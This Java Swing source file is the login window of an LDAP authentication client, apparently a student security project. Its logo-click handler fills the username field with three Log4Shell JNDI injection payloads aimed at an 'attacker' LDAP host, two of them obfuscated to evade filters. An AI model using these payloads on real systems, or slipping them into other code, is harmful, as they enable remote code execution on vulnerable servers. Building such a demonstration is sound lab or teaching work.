package hpc.mvn.auth.client.view;
//----------
import hpc.mvn.auth.client.controller.Auth;
import hpc.mvn.auth.client.controller.Util;
import hpc.mvn.auth.client.controller.LogPanel;
//----------
import java.awt.Color;
import java.io.UnsupportedEncodingException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.ImageIcon;
/**
 *
 * @author	Muhammad Nur Irsyad
 * @id		1807422020
 * @class	CCIT SEC 8 (TMJ)
 */
public class Login extends javax.swing.JFrame {
        private int ctr = 0, filtered = 0;
	private Util objUtil = new Util();
	private Auth objAuth = new Auth();
	private LogPanel objPanel = new LogPanel();
	//
	public Login() {
		initComponents();
		objPanel.loadLog(listLogging, listScrollPane);
		if (System.getProperty("os.name").toLowerCase().contains("linux")) {
			listLogging.setFont(new java.awt.Font("DejaVu Sans Mono", 0, 10));                   
		}	
	}

	/**
	 * This method is called from within the constructor to initialize the form. WARNING: Do NOT modify this code. The content of this method is always regenerated by the Form Editor.
	 */
	@SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        base = new javax.swing.JPanel();
        loginSection = new javax.swing.JPanel();
        logo = new javax.swing.JLabel();
        inUsername = new javax.swing.JTextField();
        underlineUsername = new javax.swing.JPanel();
        underlinePassword = new javax.swing.JPanel();
        iconUsername = new javax.swing.JLabel();
        iconPassword = new javax.swing.JLabel();
        inPassword = new javax.swing.JPasswordField();
        btnSignin = new javax.swing.JButton();
        btnForgotPassword = new javax.swing.JLabel();
        profileSection = new javax.swing.JPanel();
        btnLogout = new javax.swing.JButton();
        valInitials = new javax.swing.JLabel();
        lblFullName = new javax.swing.JLabel();
        lblUsername = new javax.swing.JLabel();
        lblEmail = new javax.swing.JLabel();
        lblGroup = new javax.swing.JLabel();
        valDisplayName = new javax.swing.JLabel();
        valUID = new javax.swing.JLabel();
        valMail = new javax.swing.JLabel();
        valGecos = new javax.swing.JLabel();
        loggingSection = new javax.swing.JPanel();
        listScrollPane = new javax.swing.JScrollPane();
        listLogging = new javax.swing.JList<>();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("PNJ - Auth Client");
        setAlwaysOnTop(true);
        setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        setLocation(new java.awt.Point(400, 200));
        setName("Body"); // NOI18N
        setResizable(false);
        addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowActivated(java.awt.event.WindowEvent evt) {
                formWindowActivated(evt);
            }
        });

        base.setBackground(new java.awt.Color(222, 254, 249));

        loginSection.setBackground(new java.awt.Color(255, 255, 255));

        logo.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        logo.setIcon(new javax.swing.ImageIcon(getClass().getResource("/ldap-logo.png"))); // NOI18N
        logo.addAncestorListener(new javax.swing.event.AncestorListener() {
            public void ancestorMoved(javax.swing.event.AncestorEvent evt) {
            }
            public void ancestorAdded(javax.swing.event.AncestorEvent evt) {
                logoAncestorAdded(evt);
            }
            public void ancestorRemoved(javax.swing.event.AncestorEvent evt) {
            }
        });
        logo.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                logoMouseClicked(evt);
            }
        });

        inUsername.setFont(new java.awt.Font("Verdana", 0, 12)); // NOI18N
        inUsername.setForeground(new java.awt.Color(103, 171, 159));
        inUsername.setText("1807422020");
        inUsername.setToolTipText("");
        inUsername.setAutoscrolls(false);
        inUsername.setBorder(null);
        inUsername.addFocusListener(new java.awt.event.FocusAdapter() {
            public void focusGained(java.awt.event.FocusEvent evt) {
                inUsernameFocusGained(evt);
            }
            public void focusLost(java.awt.event.FocusEvent evt) {
                inUsernameFocusLost(evt);
            }
        });

        underlineUsername.setPreferredSize(new java.awt.Dimension(189, 5));

        javax.swing.GroupLayout underlineUsernameLayout = new javax.swing.GroupLayout(underlineUsername);
        underlineUsername.setLayout(underlineUsernameLayout);
        underlineUsernameLayout.setHorizontalGroup(
            underlineUsernameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 0, Short.MAX_VALUE)
        );
        underlineUsernameLayout.setVerticalGroup(
            underlineUsernameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 5, Short.MAX_VALUE)
        );

        underlinePassword.setPreferredSize(new java.awt.Dimension(189, 5));

        javax.swing.GroupLayout underlinePasswordLayout = new javax.swing.GroupLayout(underlinePassword);
        underlinePassword.setLayout(underlinePasswordLayout);
        underlinePasswordLayout.setHorizontalGroup(
            underlinePasswordLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 0, Short.MAX_VALUE)
        );
        underlinePasswordLayout.setVerticalGroup(
            underlinePasswordLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 5, Short.MAX_VALUE)
        );

        iconUsername.setIcon(new javax.swing.ImageIcon(getClass().getResource("/icons8-npc-face-30.png"))); // NOI18N
        iconUsername.setToolTipText("username or uid");
        iconUsername.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                iconUsernameMouseClicked(evt);
            }
        });

        iconPassword.setIcon(new javax.swing.ImageIcon(getClass().getResource("/icons8-password-1-24.png"))); // NOI18N
        iconPassword.setToolTipText("password");

        inPassword.setFont(new java.awt.Font("Verdana", 0, 12)); // NOI18N
        inPassword.setForeground(new java.awt.Color(103, 171, 159));
        inPassword.setBorder(null);
        inPassword.addAncestorListener(new javax.swing.event.AncestorListener() {
            public void ancestorMoved(javax.swing.event.AncestorEvent evt) {
            }
            public void ancestorAdded(javax.swing.event.AncestorEvent evt) {
                inPasswordAncestorAdded(evt);
            }
            public void ancestorRemoved(javax.swing.event.AncestorEvent evt) {
            }
        });
        inPassword.addFocusListener(new java.awt.event.FocusAdapter() {
            public void focusGained(java.awt.event.FocusEvent evt) {
                inPasswordFocusGained(evt);
            }
            public void focusLost(java.awt.event.FocusEvent evt) {
                inPasswordFocusLost(evt);
            }
        });

        btnSignin.setBackground(new java.awt.Color(103, 171, 159));
        btnSignin.setFont(new java.awt.Font("JetBrains Mono Light", 1, 14)); // NOI18N
        btnSignin.setForeground(new java.awt.Color(255, 255, 255));
        btnSignin.setText("SIGN IN");
        btnSignin.setToolTipText("Sign In");
        btnSignin.setBorder(null);
        btnSignin.setBorderPainted(false);
        btnSignin.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnSignin.setFocusPainted(false);
        btnSignin.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnSigninActionPerformed(evt);
            }
        });

        btnForgotPassword.setFont(new java.awt.Font("Verdana", 0, 11)); // NOI18N
        btnForgotPassword.setForeground(new java.awt.Color(103, 171, 159));
        btnForgotPassword.setText("forgot your password?");
        btnForgotPassword.setToolTipText("<html>\nthe username or uid are required to be able<br>to perform the new password request\n</html>");
        btnForgotPassword.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnForgotPassword.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                btnForgotPasswordMouseClicked(evt);
            }
        });

        javax.swing.GroupLayout loginSectionLayout = new javax.swing.GroupLayout(loginSection);
        loginSection.setLayout(loginSectionLayout);
        loginSectionLayout.setHorizontalGroup(
            loginSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(loginSectionLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(loginSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(btnSignin, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(logo, javax.swing.GroupLayout.DEFAULT_SIZE, 276, Short.MAX_VALUE)
                    .addGroup(loginSectionLayout.createSequentialGroup()
                        .addGroup(loginSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(iconUsername)
                            .addComponent(iconPassword))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(loginSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(inPassword, javax.swing.GroupLayout.Alignment.TRAILING)
                            .addComponent(underlineUsername, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 246, Short.MAX_VALUE)
                            .addComponent(underlinePassword, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 246, Short.MAX_VALUE)
                            .addComponent(inUsername, javax.swing.GroupLayout.Alignment.TRAILING)))
                    .addGroup(loginSectionLayout.createSequentialGroup()
                        .addComponent(btnForgotPassword)
                        .addGap(0, 0, Short.MAX_VALUE)))
                .addContainerGap())
        );
        loginSectionLayout.setVerticalGroup(
            loginSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(loginSectionLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(logo, javax.swing.GroupLayout.PREFERRED_SIZE, 50, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18)
                .addGroup(loginSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(inUsername, javax.swing.GroupLayout.PREFERRED_SIZE, 23, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(iconUsername))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(underlineUsername, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(loginSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(iconPassword)
                    .addComponent(inPassword, javax.swing.GroupLayout.PREFERRED_SIZE, 23, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(underlinePassword, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(26, 26, 26)
                .addComponent(btnSignin, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 103, Short.MAX_VALUE)
                .addComponent(btnForgotPassword)
                .addContainerGap())
        );

        profileSection.setBackground(new java.awt.Color(255, 255, 255));

        btnLogout.setIcon(new javax.swing.ImageIcon(getClass().getResource("/icons8-arrow-48.png"))); // NOI18N
        btnLogout.setToolTipText("Sign Out");
        btnLogout.setBorder(null);
        btnLogout.setBorderPainted(false);
        btnLogout.setContentAreaFilled(false);
        btnLogout.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnLogout.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnLogoutActionPerformed(evt);
            }
        });

        valInitials.setFont(new java.awt.Font("Verdana", 1, 20)); // NOI18N
        valInitials.setForeground(new java.awt.Color(153, 153, 153));
        valInitials.setText("initials");

        lblFullName.setFont(new java.awt.Font("Verdana", 0, 10)); // NOI18N
        lblFullName.setForeground(new java.awt.Color(153, 153, 153));
        lblFullName.setText("full name");

        lblUsername.setFont(new java.awt.Font("Verdana", 0, 10)); // NOI18N
        lblUsername.setForeground(new java.awt.Color(153, 153, 153));
        lblUsername.setText("username");

        lblEmail.setFont(new java.awt.Font("Verdana", 0, 10)); // NOI18N
        lblEmail.setForeground(new java.awt.Color(153, 153, 153));
        lblEmail.setText("email");

        lblGroup.setFont(new java.awt.Font("Verdana", 0, 10)); // NOI18N
        lblGroup.setForeground(new java.awt.Color(153, 153, 153));
        lblGroup.setText("group");

        valDisplayName.setFont(new java.awt.Font("Verdana", 0, 10)); // NOI18N
        valDisplayName.setForeground(new java.awt.Color(153, 153, 153));
        valDisplayName.setText("displayName");

        valUID.setFont(new java.awt.Font("Verdana", 0, 10)); // NOI18N
        valUID.setForeground(new java.awt.Color(153, 153, 153));
        valUID.setText("uid");

        valMail.setFont(new java.awt.Font("Verdana", 0, 10)); // NOI18N
        valMail.setForeground(new java.awt.Color(153, 153, 153));
        valMail.setText("mail");

        valGecos.setFont(new java.awt.Font("Verdana", 0, 10)); // NOI18N
        valGecos.setForeground(new java.awt.Color(153, 153, 153));
        valGecos.setText("gecos");

        javax.swing.GroupLayout profileSectionLayout = new javax.swing.GroupLayout(profileSection);
        profileSection.setLayout(profileSectionLayout);
        profileSectionLayout.setHorizontalGroup(
            profileSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(profileSectionLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(profileSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(profileSectionLayout.createSequentialGroup()
                        .addComponent(valInitials, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addGap(18, 18, 18)
                        .addComponent(btnLogout))
                    .addGroup(profileSectionLayout.createSequentialGroup()
                        .addGroup(profileSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(lblUsername)
                            .addComponent(lblEmail)
                            .addComponent(lblGroup)
                            .addComponent(lblFullName))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addGroup(profileSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(valDisplayName, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(valUID, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(valMail, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(valGecos, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))))
                .addContainerGap())
        );
        profileSectionLayout.setVerticalGroup(
            profileSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(profileSectionLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(profileSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(btnLogout)
                    .addComponent(valInitials, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(profileSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lblFullName)
                    .addComponent(valDisplayName))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(profileSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lblUsername)
                    .addComponent(valUID))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(profileSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lblEmail)
                    .addComponent(valMail))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(profileSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lblGroup)
                    .addComponent(valGecos))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        loggingSection.setBackground(new java.awt.Color(255, 255, 255));

        listScrollPane.setBorder(null);
        listScrollPane.setHorizontalScrollBarPolicy(javax.swing.ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
        listScrollPane.setVerticalScrollBarPolicy(javax.swing.ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
        listScrollPane.setMinimumSize(new java.awt.Dimension(10, 5));

        listLogging.setBorder(null);
        listLogging.setFont(new java.awt.Font("Consolas", 0, 10)); // NOI18N
        listLogging.setSelectionBackground(new java.awt.Color(103, 171, 159));
        listScrollPane.setViewportView(listLogging);

        javax.swing.GroupLayout loggingSectionLayout = new javax.swing.GroupLayout(loggingSection);
        loggingSection.setLayout(loggingSectionLayout);
        loggingSectionLayout.setHorizontalGroup(
            loggingSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(loggingSectionLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(listScrollPane, javax.swing.GroupLayout.DEFAULT_SIZE, 505, Short.MAX_VALUE)
                .addContainerGap())
        );
        loggingSectionLayout.setVerticalGroup(
            loggingSectionLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(loggingSectionLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(listScrollPane, javax.swing.GroupLayout.PREFERRED_SIZE, 0, Short.MAX_VALUE)
                .addContainerGap())
        );

        javax.swing.GroupLayout baseLayout = new javax.swing.GroupLayout(base);
        base.setLayout(baseLayout);
        baseLayout.setHorizontalGroup(
            baseLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(baseLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(loginSection, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(baseLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(profileSection, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(loggingSection, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );
        baseLayout.setVerticalGroup(
            baseLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(baseLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(baseLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(loginSection, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(baseLayout.createSequentialGroup()
                        .addComponent(profileSection, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(loggingSection, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)))
                .addContainerGap())
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(base, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(base, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void formWindowActivated(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowActivated
        // TODO add your handling code here:
		ImageIcon icon = new ImageIcon("src/main/resources/icons8-active-directory-48.png");
		setIconImage(icon.getImage());		
    }//GEN-LAST:event_formWindowActivated

    private void inUsernameFocusGained(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_inUsernameFocusGained
		objUtil.placeHolderUsername(inUsername, 1);
    }//GEN-LAST:event_inUsernameFocusGained

    private void inUsernameFocusLost(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_inUsernameFocusLost
		objUtil.placeHolderUsername(inUsername, 0);
    }//GEN-LAST:event_inUsernameFocusLost

    private void logoAncestorAdded(javax.swing.event.AncestorEvent evt) {//GEN-FIRST:event_logoAncestorAdded
		requestFocusInWindow();
    }//GEN-LAST:event_logoAncestorAdded

    private void inPasswordFocusGained(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_inPasswordFocusGained
		objUtil.placeHolderPassword(inPassword, 1);
    }//GEN-LAST:event_inPasswordFocusGained

    private void inPasswordFocusLost(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_inPasswordFocusLost
		objUtil.placeHolderPassword(inPassword, 0);
    }//GEN-LAST:event_inPasswordFocusLost

    private void btnSigninActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSigninActionPerformed
            try {
                // TODO add your handling code here:
                objAuth.performLogin(this.inUsername, this.inPassword, this.listLogging, this.listScrollPane, this.valDisplayName, this.valUID, this.valMail, this.valGecos, this.valInitials, filtered);
            } catch (UnsupportedEncodingException ex) {
                Logger.getLogger(Login.class.getName()).log(Level.SEVERE, null, ex);
            }
    }//GEN-LAST:event_btnSigninActionPerformed

    private void inPasswordAncestorAdded(javax.swing.event.AncestorEvent evt) {//GEN-FIRST:event_inPasswordAncestorAdded
		inPassword.setForeground(Color.GRAY);
		inPassword.setText("password");
    }//GEN-LAST:event_inPasswordAncestorAdded

    private void btnForgotPasswordMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_btnForgotPasswordMouseClicked
            try {
                objUtil.requestPassword(this.inUsername, this.listLogging, this.listScrollPane, this.valInitials, filtered);
            } catch (UnsupportedEncodingException ex) {
                Logger.getLogger(Login.class.getName()).log(Level.SEVERE, null, ex);
            }
    }//GEN-LAST:event_btnForgotPasswordMouseClicked

    private void btnLogoutActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnLogoutActionPerformed
            try {
                objAuth.performLogout(inUsername, inPassword, listLogging, listScrollPane, valDisplayName, valUID, valMail, valGecos, valInitials);
            } catch (UnsupportedEncodingException ex) {
                Logger.getLogger(Login.class.getName()).log(Level.SEVERE, null, ex);
            }
    }//GEN-LAST:event_btnLogoutActionPerformed

    private void logoMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_logoMouseClicked
        // TODO add your handling code here:
        switch(ctr) {
            case 0:
                inUsername.setText("${jndi:ldap://192.168.113.9:2038/cn=1807422020,dc=attacker,dc=com}");
                inUsername.setCaretPosition(0);
                ctr++;
                break;
            case 1:
                inUsername.setText("${${lower:${lower:jndi}}:${lower:${::-l}${::-d}${::-a}${::-p}}://192.168.113.9:2038/cn=1807422020,dc=attacker,dc=com}");
                inUsername.setCaretPosition(0);
                ctr++;                
                break;                
            case 2:
                inUsername.setText("${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}${lower:${::-l}${::-d}${::-a}${::-p}}}://192.168.113.9:2038/cn=1807422020,dc=attacker,dc=com}");
                inUsername.setCaretPosition(0);
                ctr = 0;                
                break;                                
        }
    }//GEN-LAST:event_logoMouseClicked

    private void iconUsernameMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_iconUsernameMouseClicked
        // TODO add your handling code here:
        switch(filtered) {
            case 0:
                inUsername.setForeground(new java.awt.Color(255,102,102));
                filtered++;
                break;
            case 1:
                inUsername.setForeground(new java.awt.Color(103,171,159));
                filtered = 0;
                break;
        }
    }//GEN-LAST:event_iconUsernameMouseClicked

	/**
	 * @param args the command line arguments
	 */
	public static void main(String args[]) {
		/* Set the Nimbus look and feel */
		//<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
		/* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
		 */
		try {
			for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
				if ("Nimbus".equals(info.getName())) {
					javax.swing.UIManager.setLookAndFeel(info.getClassName());
					break;
				}
			}
		} catch (ClassNotFoundException ex) {
			java.util.logging.Logger.getLogger(Login.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
		} catch (InstantiationException ex) {
			java.util.logging.Logger.getLogger(Login.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
		} catch (IllegalAccessException ex) {
			java.util.logging.Logger.getLogger(Login.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
		} catch (javax.swing.UnsupportedLookAndFeelException ex) {
			java.util.logging.Logger.getLogger(Login.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
		}
		//</editor-fold>
		//</editor-fold>

		/* Create and display the form */
		java.awt.EventQueue.invokeLater(new Runnable() {
			public void run() {
				new Login().setVisible(true);
			}
		});
	}

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JPanel base;
    private javax.swing.JLabel btnForgotPassword;
    private javax.swing.JButton btnLogout;
    private javax.swing.JButton btnSignin;
    private javax.swing.JLabel iconPassword;
    private javax.swing.JLabel iconUsername;
    private javax.swing.JPasswordField inPassword;
    private javax.swing.JTextField inUsername;
    private javax.swing.JLabel lblEmail;
    private javax.swing.JLabel lblFullName;
    private javax.swing.JLabel lblGroup;
    private javax.swing.JLabel lblUsername;
    private javax.swing.JList<String> listLogging;
    private javax.swing.JScrollPane listScrollPane;
    private javax.swing.JPanel loggingSection;
    private javax.swing.JPanel loginSection;
    private javax.swing.JLabel logo;
    private javax.swing.JPanel profileSection;
    private javax.swing.JPanel underlinePassword;
    private javax.swing.JPanel underlineUsername;
    private javax.swing.JLabel valDisplayName;
    private javax.swing.JLabel valGecos;
    private javax.swing.JLabel valInitials;
    private javax.swing.JLabel valMail;
    private javax.swing.JLabel valUID;
    // End of variables declaration//GEN-END:variables
}
